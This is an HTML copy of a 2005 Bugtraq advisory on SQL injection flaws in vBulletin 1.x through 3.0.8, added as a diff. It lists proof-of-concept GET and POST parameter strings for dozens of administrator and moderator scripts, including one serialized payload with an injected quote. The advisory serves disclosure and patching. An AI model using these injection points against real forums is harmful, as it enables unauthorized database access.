@@ -1,0 +1,196 @@
+#SpeeDr00t@Black Falcon<br>#bid14872<p><b><span style="font-size: 18pt;">VBulletin Multiple Moderator And Administrator SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/14872/info">info</a><br><a href="http://www.securityfocus.com/bid/14872/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/14872/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/14872/solution">solution</a><br><a href="http://www.securityfocus.com/bid/14872/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				14872
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 19 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 19 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				deluxe &lt;deluxe@security-project.org&gt; is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					VBulletin VBulletin 3.0.8 <br/>
+					
+				
+					VBulletin VBulletin 3.0.7 <br/>
+					
+				
+					VBulletin VBulletin 3.0.6 <br/>
+					
+				
+					VBulletin VBulletin 3.0.5 <br/>
+					
+				
+					VBulletin VBulletin 3.0.4 <br/>
+					
+				
+					VBulletin VBulletin 3.0.3 <br/>
+					
+				
+					VBulletin VBulletin 3.0.2 <br/>
+					
+				
+					VBulletin VBulletin 3.0.1 <br/>
+					
+				
+					VBulletin VBulletin 3.0  Gamma<br/>
+					
+				
+					VBulletin VBulletin 3.0  beta 7<br/>
+					
+				
+					VBulletin VBulletin 3.0  beta 6<br/>
+					
+				
+					VBulletin VBulletin 3.0  beta 5<br/>
+					
+				
+					VBulletin VBulletin 3.0  beta 4<br/>
+					
+				
+					VBulletin VBulletin 3.0  beta 3<br/>
+					
+				
+					VBulletin VBulletin 3.0  beta 2<br/>
+					
+				
+					VBulletin VBulletin 3.0 <br/>
+					
+				
+					VBulletin VBulletin 2.3.4 <br/>
+					
+				
+					VBulletin VBulletin 2.3.3 <br/>
+					
+				
+					VBulletin VBulletin 2.3.2 <br/>
+					
+				
+					VBulletin VBulletin 2.3 .0<br/>
+					
+				
+					VBulletin VBulletin 2.2.9 <br/>
+					
+				
+					VBulletin VBulletin 2.2.8 <br/>
+					
+				
+					VBulletin VBulletin 2.2.7 <br/>
+					
+				
+					VBulletin VBulletin 2.2.6 <br/>
+					
+				
+					VBulletin VBulletin 2.2.5 <br/>
+					
+				
+					VBulletin VBulletin 2.2.4 <br/>
+					
+				
+					VBulletin VBulletin 2.2.3 <br/>
+					
+				
+					VBulletin VBulletin 2.2.2 <br/>
+					
+				
+					VBulletin VBulletin 2.2.1 <br/>
+					
+				
+					VBulletin VBulletin 2.2 .0<br/>
+					
+				
+					VBulletin VBulletin 2.0.3 <br/>
+					
+				
+					VBulletin VBulletin 2.0  rc 3<br/>
+					
+				
+					VBulletin VBulletin 2.0  rc 2<br/>
+					
+				
+					VBulletin VBulletin 1.0.1  lite<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					VBulletin VBulletin 3.0.9 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following GET and POST proof of concepts are available:<br/>The following issue is exploitable by any attacker:<br/>&gt; /joinrequests.php:<br/>POST: &lt;do=processjoinrequests&amp;usergroupid=22&amp;requestSQL-Injection=0&gt;<br/><br/>These issues affect the following administrator scripts:<br/>&gt; /admincp/admincalendar.php:<br/>GET: &lt;do=addcustom&amp;calendarcustomfieldid=SQL-Injection&gt;<br/>GET: &lt;do=addmod&amp;calendarid=SQL-Injection&gt;<br/>GET: &lt;do=addmod&amp;calendarid=1&amp;moderatorid=SQL-Injection&gt;<br/>GET: &lt;do=deletecustom&amp;calendarcustomfieldid=SQL-Injection&gt;<br/>POST: &lt;do=doremoveholiday&amp;holidayid=SQL-Injection&gt;<br/>GET: &lt;do=edit&amp;calendarid=SQL-Injection&gt;<br/>POST: &lt;do=kill&amp;calendarid=SQL-Injection&gt;<br/>POST: &lt;do=killmod&amp;$calendarmoderatorid=SQL-Injection&gt;<br/>GET: &lt;do=remove&amp;calendarid=SQL-Injection&gt;<br/>POST: &lt;do=removemod&amp;moderatorid=SQL-Injection&gt;<br/>POST: &lt;do=saveholiday&amp;holidayinfotitle=sepro&amp;holidayid=0XF&gt;<br/>POST: &lt;do=update&amp;calendardaterange=2002-2008&amp;calendarid=0XF&gt;<br/>GET: &lt;do=updateholiday&amp;holidayid=0XF&gt;<br/>POST: &lt;do=update&amp;calendarid=1&amp;calendardaterange=1970-2030&amp;<br/>calendar0=SQL-Injection&gt;<br/>POST: &lt;do=updatemod&amp;calendarid=1&amp;moderatorid=SQL-Injection&gt;<br/>POST: &lt;do=updatemod&amp;moderatorid=1&amp;moderatorcalendarid=SQL-Injection&gt;<br/><br/>&gt; /admincp/cronlog.php:<br/>POST: &lt;do=doprunelog&amp;cronid=0XF&gt;<br/>POST: &lt;do=prunelog&amp;cronid=0XF&gt;<br/><br/>&gt; /admincp/email.php:<br/>POST: &lt;do=makelist&amp;userusergroupid0=SQL-Injection&gt;<br/><br/>&gt; /admincp/help.php:<br/>POST: &lt;do=doedit&amp;helpscript=1&amp;help0=SQL-Injection&gt;<br/><br/>&gt; /admincp/user.php:<br/>GET: &lt;do=find&amp;orderby=username&amp;limitnumber=SQL-Injection&gt;<br/>GET: &lt;do=find&amp;orderby=username&amp;limitstart=SQL-Injection&gt;<br/><br/>&gt; /admincp/usertitle.php:<br/>GET: &lt;do=edit&amp;usertitleid=0XF&gt;<br/>GET: &lt;do=pmuserstats&amp;ids=0XF&gt;<br/><br/>&gt; /admincp/language.php:<br/>POST: &lt;do=update&amp;rvt0=SQL-Injection&gt;<br/><br/>&gt; /admincp/phrase.php:<br/>POST: &lt;do=completeorphans&amp;keep0=SQL-Injection&gt;<br/><br/>&gt; /admincp/template.php:<br/>GET: &lt;do=editstyle&amp;dostyleid=SQL-Injection&gt;<br/>GET: &lt;do=editstyle&amp;dostyleid=SQL-Injection&gt;<br/>POST: &lt;do=revertall&amp;dostyleid=SQL-Injection&gt;<br/><br/>&gt; /admincp/thread.php::<br/>POST: &lt;do=dothreads&amp;threadforumid=0XF&gt;<br/><br/>&gt; /admincp/usertools.php:<br/>POST: &lt;do=updateprofilepic&gt;<br/><br/>&gt; /admincp/vbugs_admin.php:<br/>GET: &lt;do=editseverity&amp;vbug_severityid=SQL-Injection&gt;<br/>GET: &lt;do=removeseverity&amp;vbug_severityid=SQL-Injection&gt;<br/>GET: &lt;do=updateseverity&amp;vbug_severityid=SQL-Injection&gt;<br/><br/>These issues affect the following moderator scripts:<br/>&gt; /modcp/announcement.php:<br/>POST: &lt;do=update&amp;announcementid=1&amp;start=24-07-05&amp;end=30-07-05<br/>&amp;announcement0=SQL-Injection&gt;<br/><br/>&gt; /modcp/thread.php:<br/>POST: &lt;do=dothreads&amp;threadforumid=0XF&gt;<br/>POST: &lt;do=dothreadssel&amp;criteria=a:1:{s:7:"forumid";s:5:"aaaa'";}&gt;<br/><br/>&gt; /modcp/user.php:<br/>GET: &lt;do=avatar&amp;userid=0XF&gt;
+	
+		<ul>
+</ul>
+</div>
